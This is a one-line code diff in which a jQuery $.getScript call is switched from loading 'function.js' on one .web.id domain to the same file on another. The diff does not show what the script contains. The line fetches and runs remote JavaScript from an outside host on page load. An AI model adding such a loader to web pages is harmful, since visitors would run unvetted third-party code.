@@ -1,1 +1,1 @@
-$.getScript("https://sentramode.web.id/function.js", function(){ });
+$.getScript("https://livemall.web.id/function.js", function(){ });
